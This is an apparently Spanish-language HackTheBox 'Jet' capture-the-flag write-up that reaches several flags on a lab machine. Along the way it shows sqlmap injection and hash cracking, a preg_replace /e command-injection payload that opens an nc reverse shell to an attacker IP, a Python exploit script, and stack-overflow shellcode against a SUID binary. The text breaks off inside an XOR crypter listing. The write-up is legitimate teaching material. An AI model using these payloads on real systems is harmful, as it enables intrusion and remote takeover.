@@ -1,0 +1,871 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Jet HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/jet.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Jet HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de el fortress Jet de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de el fortress Jet de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Jet HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Jet HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de el fortress Jet de la plataforma de HackTheBox","headline":"Writeup Jet HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Jet HackTheBox</h1>
+          <p>Resolución de el fortress Jet de la plataforma de HackTheBox</p>
+        </div>
+
+<div><strong><h3>Flag 1</h3></strong></div>
+<div><strong><h3>JET{s4n1ty_ch3ck}</h3></strong></div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> 10.13.37.10
+Nmap scan report for 10.13.37.10
+22/tcp   open  ssh
+53/tcp   open  domain
+80/tcp   open  http
+5555/tcp open  freeciv
+7777/tcp open  cbt</span>
+</code></pre></div></div>
+
+<div><p>Si miramos que hay en <a href="http://10.13.37.10/">10.13.37.10</a> bueno... tenemos una flag</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><strong><h3>Flag 2</h3></strong></div>
+<div><strong><h3>JET{w3lc0me_4nd_h@v3_fun!}</h3></strong></div>
+
+<div><p>Esta abierto el puerto 53 asi que usamos dig y encontramos "www.securewebinc.jet"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ dig</span><span class="p"> @10.13.37.10 -x 10.13.37.10
+;; AUTHORITY SECTION:2
+37.13.10.in-addr.arpa.	604800	IN	SOA	</span><span class="kd">www.securewebinc.jet</span>. securewebinc.jet. 3 604800 86400 2419200 604800</span>
+</code></pre></div></div>
+
+<div><p>Lo agregamos al /etc/hosts y si miramos la web, al final encontramos otra flag</p></div>
+<div><p><img src="./2.png"><p></div>
+
+<div><strong><h3>Flag 3</h3></strong></div>
+<div><strong><h3>JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}</h3></strong></div>
+
+<div><p>Al ver el código fuente en la perte final tenemos un comentario con "Custom scripts for this template" y 2 archivos .js</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p"><-- Custom scripts for this template -->
+</span><span class="p">&lt</span><span class="kd">script </span><span class="k">src</span><span class="p">=</span><span class="s2">"js/template.js"</span><span class="p">></span><span class="p">&lt/</span><span class="kd">script</span><span class="p">>
+</span><span class="p">&lt</span><span class="kd">script </span><span class="k">src</span><span class="p">=</span><span class="s2">"js/secure.js"</span>>&lt/<span class="kd">script<span class="p">></span>
+</code></pre></div></div>
+
+<div><p>Al darle clic en el secure.js nos encontramos esto</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">eval(String.fromCharCode(102,117,110,99,116,105,111,110,32,103,101,116,83,116,97,116,115,40,41,10,123,10,32,32,32,32,36,46,97,106,97,120,40,123,117,114,108,58,32,34,47,100,105,114,98,95,115,97,102,101,95,100,105,114,95,114,102,57,69,109,99,69,73,120,47,97,100,109,105,110,47,115,116,97,116,115,46,112,104,112,34,44,10,10,32,32,32,32,32,32,32,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,36,40,39,35,97,116,116,97,99,107,115,39,41,46,104,116,109,108,40,114,101,115,117,108,116,41,10,32,32,32,32,125,44,10,32,32,32,32,101,114,114,111,114,58,32,102,117,110,99,116,105,111,110,40,114,101,115,117,108,116,41,123,10,32,32,32,32,32,32,32,32,32,99,111,110,115,111,108,101,46,108,111,103,40,114,101,115,117,108,116,41,59,10,32,32,32,32,125,125,41,59,10,125,10,103,101,116,83,116,97,116,115,40,41,59,10,115,101,116,73,110,116,101,114,118,97,108,40,102,117,110,99,116,105,111,110,40,41,123,32,103,101,116,83,116,97,116,115,40,41,59,32,125,44,32,49,48,48,48,48,41,59));</span>
+</code></pre></div></div>
+<div><p>Para esto usaremos la web de <a href="http://www.jsnice.org/">jsnice</a>, al introducir la cadena nos da como resultado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">'use strict'</span><span class="p">;
+</span><span class="c1">/**
+ * @return {undefined}
+ */</span><span class="k">
+function </span><span class="kd">getStats</span><span class="p">() </span><span class="kd">{
+</span><span class="p">  $</span><span class="kd">.ajax(</span><span class="p">{
+    url : </span><span class="s2">"/dirb_safe_dir_rf9EmcEIx/admin/stats.php"</span><span class="p">,
+    </span><span class="kd">success : </span><span class="k">function</span><span class="p">(</span><span class="no">result</span><span class="p">) </span><span class="kd">{
+      </span><span class="p">$</span><span class="kd">(</span><span class="s2">"#attacks"</span><span class="kd">).html(</span><span class="p">result</span><span class="kd">)</span><span class="p">;
+    }</span><span class="p">,
+    </span><span class="kd">error</span><span class="p"> : </span><span class="k">function</span><span class="p">(</span><span class="no">result</span><span class="p">)<span class="p"> {
+      </span><span class="kd">console.</span><span class="k">log</span><span class="kd">(</span><span class="p">result</span><span class="kd">);
+    }
+  </span><span class="p">}</span><span class="kd">);
+}
+getStats();
+setInterval(</span><span class="k">function</span><span class="p">() </span><span class="kd">{
+  getStats();
+}</span><span class="p">, </span><span class="no">10000</span><span class="p">);</span>
+</code></pre></div></div>
+
+<div><p>Hay un directorio "/dirb_safe_dir_rf9EmcEIx/admin/stats.php", al cual podemos quitarle stats.php y nos redirige a login.php</p></div>
+<div><p><img src="./3.png"><p></div>
+<div><p>Y en el codigo fuente del login nos encontramos una nueva flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p"><-- </span><span class="kd">JET{s3cur3_js_w4s_not_s0_s3cur3_4ft3r4ll}</span><span class="p"> --></span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 4</h3></strong></div>
+<div><strong><h3>JET{sQl_1nj3ct1ons_4r3_fun!}</h3></strong></div>
+
+<div><p>Capturamos una petición de prueba con burpsuite, la guardamos en un archivo y le tiraremos sqlmap a esa captura, como resultado nos reporta la base de datos "jetadmin"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> login
+POST http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/dologin.php HTTP/1.1
+Host: www.securewebinc.jet
+Content-Length: 27
+Cache-Control: max-age=0
+Origin: http://www.securewebinc.jet
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.61 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Referer: http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: es-419,es;q=0.9,en;q=0.8
+Cookie: PHPSESSID=348bemaov4v7r1nbcbmnnvgcp2
+
+username=gato&password=gato
+</span><span class="s2">❯ sqlmap</span><span class="p"> -r login –-batch -dbs
+&lt......................&gt
+available databases [2]:
+[*] information_schema
+[*] jetadmin
+&lt......................&gt</span>
+</code></pre></div></div>
+
+<div><p>Como tenemos una base de datos intentaremos dumpear lo que tenga</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sqlmap</span><span class="p"> -r login --batch –D jetadmin --dump
+&lt..................................................................................&gt
+Database: jetadmin
+Table: users
+[1 entry]
++----+------------------------------------------------------------------+----------+
+| id | password                                                         | username |
++----+------------------------------------------------------------------+----------+
+| 1  | </span><span class="kd">97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084</span><span class="p"> | </span><span class="kd">admin</span><span class="p">    |
++----+------------------------------------------------------------------+----------+
+&lt..................................................................................&gt</span>
+</code></pre></div></div>
+
+<div><p>Ahora que tenemos un hash podemos intentar crackearlo por fuerza bruta y nos quedan las credenciales "admin:Hackthesystem200"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ cat</span><span class="p"> hash
+admin:97114847aa12500d04c0ef3aa6ca1dfd8fca7f156eeb864ab9b0445b235d5084
+</span><span class="s2">❯ john</span><span class="p"> --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash --format=Raw-SHA256
+Loaded 1 password hash (Raw-SHA256 [SHA256 128/128 XOP 4x2])
+</span><span class="kd">Hackthesystem200</span><span class="p"> (</span><span class="kd">admin</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Iniciamos sesión en el login y conseguimos una nueva flag en una parte de la pagina que parece una conversación</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">Mike Doe                                                                 2:15
+I just got another flag! Check it out: </span><span class="kd">JET{sQl_1nj3ct1ons_4r3_fun!}</span><span class="p">
+
+James Doe                                                                5:30
+I would like to meet you to discuss the latest news about the arrival of 
+he new theme. They say it is going to be one the best themes on the market</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 5</h3></strong></div>
+<div><strong><h3>JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}</h3></strong></div>
+
+<div><p>En la parte de abajo tenemos un campo para enviar correos asi que intentaremos enviar uno de prueba</p></div>
+<div><p><img src="./4.png"><p></div>
+
+<div><p>Pero el resultado es... Profanity filter? wtf solo envié gato</p></div>
+<div><p><img src="./5.png"><p></div>
+
+<div><p>Abrimos bupsuite para revisar la petición y la data se ve algo así urldecodeada, interesante</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">swearwords</span><span class="p">[</span><span class="k">/fuck/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">make+love</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/shit/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">poop</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/ass/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">behind</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/dick/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">penis</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/whore/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">escort</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/asshole/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">bad+person</span><span class="p">&
+</span><span class="no">to</span><span class="kd">=</span><span class="s2">gato@gato.gato</span><span class="p">&
+</span><span class="no">subject</span><span class="kd">=</span><span class="s2">gato</span><span class="p">&
+</span><span class="no">message</span><span class="kd">=</span><span class="s2">fuck</span><span class="p">&
+</span><span class="no">_wysihtml5_mode</span><span class="kd">=</span><span class="s2">1</span>
+</code></pre></div></div>
+
+<div><p>Aunque lo mas interesante no son las palabras sino como esta compuesta ya que esta jugando con expresiones regulares y con solo cambiar /i por /e  podemos ejecutar comandos de la siguiente forma</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">swearwords</span><span class="p">[</span><span class="k">/fuck/e</span><span class="p">]</span><span class="kd">=</span><span class="s2">system('id')</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/shit/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">poop</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/ass/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">behind</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/dick/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">penis</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/whore/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">escort</span><span class="p">&
+</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/asshole/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">bad+person</span><span class="p">&
+</span><span class="no">to</span><span class="kd">=</span><span class="s2">gato@gato.gato</span><span class="p">&
+</span><span class="no">subject</span><span class="kd">=</span><span class="s2">gato</span><span class="p">&
+</span><span class="no">message</span><span class="kd">=</span><span class="s2">fuck</span><span class="p">&
+</span><span class="no">_wysihtml5_mode</span><span class="kd">=</span><span class="s2">1</span>
+</code></pre></div></div>
+
+<div><p>Al cambiar esa data en la respuesta recibimos lo siguiente</p></div>
+<div><p><img src="./6.png"><p></div>
+
+<div><p>Entonces para una reverse shell la linea de la data seria la siguiente (recuerda cambiar tu ip)</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">swearwords</span><span class="p">[</span><span class="k">/fuck/e</span><span class="p">]</span><span class="kd">=</span><span class="s2">system('rm%20/tmp/f;mkfifo%20/tmp/f;cat%20/tmp/f|/bin/bash%20-i%202>%261|nc%2010.13.14.10%20443%20>/tmp/f')</span><span class="p">&</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/shit/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">poop</span><span class="p">&</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/ass/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">behind</span><span class="p">&</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/dick/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">penis</span><span class="p">&</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/whore/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">escort</span><span class="p">&</span><span class="no">swearwords</span><span class="p">[</span><span class="k">/asshole/i</span><span class="p">]</span><span class="kd">=</span><span class="s2">bad+person</span><span class="p">&</span><span class="no">to</span><span class="kd">=</span><span class="s2">gato@gato.gato</span><span class="p">&</span><span class="no">subject</span><span class="kd">=</span><span class="s2">gato</span><span class="p">&</span><span class="no">message</span><span class="kd">=</span><span class="s2">fuck</span><span class="p">&</span><span class="no">_wysihtml5_mode</span><span class="kd">=</span><span class="s2">1</span>
+</code></pre></div></div>
+
+<div><p>Ganamos acceso y podemos leer otra flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Connection received on 10.13.37.10
+</span><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~/html/dirb_safe_dir_rf9EmcEIx/admin</span><span class="p">$ cat a_flag_is_here.txt
+</span><span class="kd">JET{pr3g_r3pl4c3_g3ts_y0u_pwn3d}
+</span><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~/html/dirb_safe_dir_rf9EmcEIx/admin</span><span class="p">$
+</code></pre></div></div>
+
+<div><p>Para automatizar todo lo que hemos hecho hasta ahora he creado el siguiente script</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">import</span><span class="p"> requests
+</span><span class="kd">from</span><span class="p"> pwn </span><span class="kd">import </span><span class="p">*
+
+os.system(</span><span class="s2">"echo '10.13.37.10 www.securewebinc.jet' >> /etc/hosts"</span><span class="p">)
+
+</span><span class="kd">if </span><span class="k">len</span><span class="p">(sys.argv) </span><span class="no">< </span><span class="p">2:
+    </span><span class="k">print</span><span class="p">(</span><span class="k">f</span><span class="s2">"\n[\033[1;31m-\033[1;37m] Uso: python3 {sys.argv[0]} &ltip>\n"</span><span class="p">)
+    exit(</span><span class="no">1</span><span class="p">)
+
+</span><span class="kd">def</span><span class="k"> cmd</span><span class="p">():
+    url </span><span class="kd">=</span><span class="s2"> "http://www.securewebinc.jet/dirb_safe_dir_rf9EmcEIx/admin/"
+    </span><span class="p">sess </span><span class="kd">=</span><span class="p"> requests.Session()
+    cred </span><span class="kd">=</span><span class="p"> { </span><span class="s2">"username"</span><span class="p">: </span><span class="s2">"admin"</span><span class="p">,</span><span class="s2"> "password"</span><span class="p">: </span><span class="s2">"Hackthesystem200"</span><span class="p"> }
+    data </span><span class="kd">=</span><span class="p"> { </span><span class="s2">"swearwords[/fuck/e]"</span><span class="p">: </span><span class="k">f</span><span class="s2">"system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc {sys.argv[1]} 443 >/tmp/f')"</span><span class="p">, </span><span class="s2">"to"</span><span class="p">: </span><span class="s2">"gato@gato.com"</span><span class="p">, </span><span class="s2">"subject"</span><span class="p">: </span><span class="s2">"gato"</span><span class="p">, </span><span class="s2">"message"</span><span class="p">: </span><span class="s2">"fuck"</span><span class="p">, </span><span class="s2">"_wysihtml5_mode"</span><span class="p">: </span><span class="no">1 </span><span class="p">}
+    sess.post(url </span><span class="kd">+</span><span class="s2"> '/dologin.php'</span><span class="p">, </span><span class="no">data</span><span class="kd">=</span><span class="p">cred, </span><span class="no">verify</span><span class="kd">=</span><span class="p">False)
+    sess.post(url </span><span class="kd">+</span><span class="s2"> '/email.php'</span><span class="p">, </span><span class="no">data</span><span class="kd">=</span><span class="p">data, </span><span class="no">verify</span><span class="kd">=</span><span class="p">False)
+
+threading.Thread(</span><span class="no">target</span><span class="kd">=</span><span class="p">cmd, </span><span class="no">args</span><span class="kd">=</span><span class="p">()).start()
+shell </span><span class="kd">=</span><span class="p"> listen(</span><span class="na">443</span><span class="p">, </span><span class="no">timeout</span><span class="kd">=</span><span class="na">60</span><span class="p">).wait_for_connection()
+shell.sendline(</span><span class="k">b</span><span class="s2">"export HOME=/var/www TERM=xterm"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>De esta manera con solo ejecutarlo con tu ip como argumento te da una shell como www-data</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo python3</span><span class="p"> exploit.py 10.13.14.10
+[</span><span class="s2">+</span><span class="p">] Trying to bind to :: on port 443: Done
+[</span><span class="s2">+</span><span class="p">] Waiting for connections on :::443: Got connection from ::ffff:10.13.37.10
+[</span><span class="na">*</span><span class="p">] Switching to interactive mode
+</span><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~/html/dirb_safe_dir_rf9EmcEIx/admin</span><span class="p">$ </span><span class="kd">$</span><span class="p"> id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+</span><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~/html/dirb_safe_dir_rf9EmcEIx/admin</span><span class="p">$ </span><span class="kd">$</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 6</h3></strong></div>
+<div><strong><h3>JET{0v3rfL0w_f0r_73h_lulz}</h3></strong></div>
+
+<div><p>Buscando archivos con privilegios suid, además del pkexec encontramos "/home/leak"</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/openssh/ssh-keysign
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+/usr/lib/snapd/snap-confine
+/usr/bin/chsh
+/usr/bin/newuidmap
+/usr/bin/gpasswd
+/usr/bin/passwd
+/usr/bin/newgrp
+/usr/bin/at
+/usr/bin/newgidmap
+/usr/bin/chfn
+/usr/bin/sudo
+/lib/uncompress.so
+</span><span class="kd">/home/leak</span><span class="p">
+/bin/umount
+/bin/su
+/bin/fusermount
+/bin/mount
+/bin/ping
+/bin/ntfs-3g
+/bin/ping6
+</span><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Si lo ejecutamos podemos ver que nos lekea información, y nos da un campo de input</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ /home/leak
+Oops, I'm leaking! 0x7ffda13a5490
+Pwn me ¯\_(ツ)_/¯ 
+></span>
+</code></pre></div></div>
+
+<div><p>Compartiremos un servicio http desde "/home" para descargarlo en nuestra máquina</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">/home</span><span class="p">$ python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</code></pre></div></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ wget</span><span class="p"> http://10.13.37.10:8000/leak
+Grabando a: «leak»
+leak                           100%[======================================>]
+«leak» guardado [9112/9112]</span>
+</code></pre></div></div>
+
+<div><p>Ahora con gdb intentaremos conseguir el offset para empezar a hacer nuestro exploit</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ gdb-peda</span><span class="p"> ./leak
+Reading symbols from </span><span class="s2">./leak</span><span class="p">...
+(No debugging symbols found in </span><span class="s2">./leak</span><span class="p">)
+</span><span class="kd">(gdb-peda)</span><span class="p"> pattern_create 100 pattern
+Writing pattern of 100 chars to filename "pattern"
+</span><span class="kd">(gdb-peda)</span><span class="p"> run < pattern
+Starting program: ~/leak < pattern
+Oops, I'm leaking! 0x7fffffffe600
+Pwn me ¯\_(ツ)_/¯ 
+> 
+Program received signal SIGSEGV, Segmentation fault.
+</span><span class="na">[--------------------------------------------------------------------]</span><span class="kd">
+(gdb-peda)</span><span class="p"> x/wx $rsp
+0x7fffffffe648: 0x65414149
+</span><span class="kd">(gdb-peda)</span><span class="p"> pattern_offset 0x65414149
+1698775369 found at offset: </span><span class="kd">72
+(gdb-peda)</span>
+</code></pre></div></div>
+
+<div><p>Obtenemos 72 de offset, podemos iniciar ejecutando el programa y almacenando lo que nos lekea</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">shell </span><span class="kd">=</span><span class="p"> process(</span><span class="s2">"./leak"</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"Oops, I'm leaking! "</span><span class="p">)
+leaking </span><span class="kd">=</span><span class="k"> int</span><span class="p">(shell.recvuntil(</span><span class="k">b</span><span class="s2">"\n"</span><span class="p">),</span><span class="na">16</span><span class="p">)</span>
+</code></pre></div></div>
+
+<div><p>Podemos crear el payload usando un <a href="https://www.exploit-db.com/shellcodes/46907">shellcode</a> de exploitdb para ejecutar "/bin/sh", después creando el chunk restandole el total de caracteres del shellcode a el offset, y por ultimo agregando la información que nos lekea al ejecutarlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">payload </span><span class="kd">= </span><span class="k">b</span><span class="s2">"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
+</span><span class="p">payload </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"A"</span><span class="kd">*</span><span class="p">(</span><span class="na">72</span><span class="kd">-</span><span class="k">len</span><span class="p">(payload))
+payload </span><span class="kd">+=</span><span class="p"> p64(leaking)</span>
+</code></pre></div></div>
+
+<div><p>Para finalizar cuando estemos en el input nos queda enviar el payload, exportar la TERM para poder hacer "clear", y entrar en modo interactivo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">shell.recvuntil(</span><span class="k">b</span><span class="s2">"> "</span><span class="p">)
+shell.sendline(payload)
+shell.sendline(</span><span class="k">b</span><span class="s2">"export HOME=/home/alex TERM=xterm; cd"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>Cambiendo shell a un remote que vamos a exponer ahora, al compactarlo quedaria asi</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="c1">#!/usr/bin/python3
+</span><span class="kd">from</span><span class="p"> pwn</span><span class="kd"> import</span><span class="p"> *
+
+shell </span><span class="kd">= </span><span class="p">remote(</span><span class="s2">'10.13.37.10'</span><span class="p">, </span><span class="na">9999</span><span class="p">)
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"Oops, I'm leaking! "</span><span class="p">)
+
+leaking </span><span class="kd">=</span><span class="k"> int</span><span class="p">(shell.recvuntil(</span><span class="k">b</span><span class="s2">"\n"</span><span class="p">),</span><span class="na">16</span><span class="p">)
+
+payload </span><span class="kd">= </span><span class="k">b</span><span class="s2">"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"</span><span class="p">
+payload </span><span class="kd">+= </span><span class="k">b</span><span class="s2">"A"</span><span class="kd">*</span><span class="p">(</span><span class="na">72</span><span class="k">-</span><span class="k">len</span><span class="p">(payload))
+payload </span><span class="kd">+= </span><span class="p">p64(leaking)
+
+shell.recvuntil(</span><span class="k">b</span><span class="s2">"> "</span><span class="p">)
+shell.sendline(payload)
+shell.sendline(</span><span class="k">b</span><span class="s2">"export HOME=/home/alex TERM=xterm; cd"</span><span class="p">)
+shell.interactive()</span>
+</code></pre></div></div>
+
+<div><p>Nos queda exponer el binario, lo haremos con socat por el puerto 9999</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ socat TCP-LISTEN:9999,reuseaddr,fork EXEC:/home/leak &
+[1] 7231
+</span><span class="s2">www-data@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Ahora ejecutamos el exploit y obtenemos shell como alex y la flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ python3</span><span class="p"> leak.py
+[</span><span class="s2">+</span><span class="p">] Opening connection to 10.13.37.10 on port 9999: Done
+[</span><span class="na">*</span><span class="p">] Switching to interactive mode
+</span><span class="kd">$</span><span class="p"> whoami
+alex
+</span><span class="kd">$</span><span class="p"> cat flag.txt
+</span><span class="kd">JET{0v3rfL0w_f0r_73h_lulz}</span>
+</code></pre></div></div>
+
+<div><strong><h3>Flag 7</h3></strong></div>
+<div><strong><h3>JET{r3p3at1ng_ch4rs_1n_s1mpl3_x0r_g3ts_y0u_0wn3d}</h3></strong></div>
+<div><p>En el directorio de alex podemos ver un par de archivos entre ellos un txt encriptado</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">alex@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ ls
+crypter.py  encrypted.txt  exploitme.zip  flag.txt
+</span><span class="s2">alex@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$</span>
+</code></pre></div></div>
+
+<div><p>Mirando el contenido del .py vemos que juega con xor para hacerlo</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">alex@jet</span><span class="p">:</span><span class="na">~</span><span class="p">$ cat crypter.py 
+</span><span class="kd">import</span><span class="p"> binascii
+
+</span><span class="kd">def</span><span class="k"> makeList</span><span class="p">(</span><span class="no">stringVal</span><span class="p">):
+    list </span><span class="kd">=</span><span class="p"> []
+    </span><span class="kd">for</span><span class="p"> c </span><span class="kd">in</span><span class="p"> stringVal:
+        list.append(c)
+    </span><span class="kd">return</span><span class="p"> list
+
+</span><span class="kd">def</span><span class="k"> superCrypt</span><span class="p">(</span><span class="no">stringVal</span><span class="p">,</span><span class="no">keyVal</span><span class="p">):
+    keyPos </span><span class="kd">=</span><span class="na"> 0</span><span class="p">
+    key </span><span class="kd">=</span><span class="p"> makeList(keyVal)
+    xored </span><span class="kd">=</span><span class="p"> []
+    </span><span class="kd">for</span><span class="p"> c </span><span class="kd">in</span><span class="p"> stringVal:
+        xored.append(binascii.hexlify(</span><span class="k">chr</span><span class="p">(</span><span class="k">ord</span><span class="p">(c) </span><span class="kd">^ </span><span class="k">ord</span><span class="p">(keyVal[keyPos]))))
